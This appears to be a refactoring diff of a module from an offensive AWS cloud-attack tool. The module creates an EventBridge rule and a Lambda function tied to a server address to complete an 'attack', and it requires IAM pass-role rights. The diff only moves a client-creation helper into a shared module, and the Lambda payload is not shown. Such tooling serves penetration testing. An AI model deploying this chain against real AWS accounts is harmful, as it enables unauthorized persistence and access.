@@ -3,6 +3,7 @@ import botocore
 import os
 import zipfile
 from colorama import Fore, Style
+from functions import create_client
 
 def help():
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
@@ -18,14 +19,6 @@ def help():
     print("[+] IMPORTANT:\n")
     print("\tYou need the 'iam:passrole' and 'lambda:create_function' permissions.")
     print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
-
-def create_client(botoconfig, session, service, region="None"):
-    if region == "None":
-        region = None
-
-    client = session.client(service, region_name=region, config=botoconfig)
-
-    return client
 
 def aws_file():
     with open("lambda_function.zip", 'rb') as file_data:
@@ -114,27 +107,27 @@ def main(botoconfig, session, selected_session):
     create_lambda_file(server_address, lambda_path)
 
     print("\n[+] Creating EventBridge Rule...")
-    event_client = create_client(botoconfig, session, "events", region_name)
-    rule_data = create_eventbrige_rule(event_client)
+    event_client = create_client.Client(botoconfig, session, "events", region_name)
+    rule_data = create_eventbrige_rule(event_client.create_aws_client())
     print("[+] Rule created: " + Fore.GREEN + "{}".format(rule_data['RuleArn']) + Style.RESET_ALL)
     results['RuleArn'] = rule_data['RuleArn'] 
 
     print("\n[+] Creating Lambda Function...")
-    lambda_client = create_client(botoconfig, session, "lambda", region_name)
-    function_data = create_lambda(lambda_client, function_role)
+    lambda_client = create_client.Client(botoconfig, session, "lambda", region_name)
+    function_data = create_lambda(lambda_client.create_aws_client(), function_role)
     print("[+] Lambda created: " + Fore.GREEN + "{}".format(function_data['FunctionName']) + Style.RESET_ALL)
     results['FunctionName'] = function_data['FunctionName']
     results['FunctionArn'] = function_data['FunctionArn']
     
     print("\n[+] Assigning target to EventBridge rule...")
-    target = assign_rule_target(event_client, function_data['FunctionName'], function_data['FunctionArn'])
+    target = assign_rule_target(event_client.create_aws_client(), function_data['FunctionName'], function_data['FunctionArn'])
     if target ['ResponseMetadata']['HTTPStatusCode'] == 200:
         print(Fore.GREEN + "[+] Targed Successfully Assinged!" + Style.RESET_ALL)
     else:
         print(Fore.RED + "[-] Failed to assign target..." + Style.RESET_ALL)
 
     print("\n[+] Assigning trigger to Lambda function...")
-    trigger = assign_trigger(lambda_client, function_data['FunctionName'], rule_data['RuleArn'])
+    trigger = assign_trigger(lambda_client.create_aws_client(), function_data['FunctionName'], rule_data['RuleArn'])
     if trigger['ResponseMetadata']['HTTPStatusCode'] == 201:
         print(Fore.GREEN + "[+] Trigger set, attack complete!" + Style.RESET_ALL)
     else:
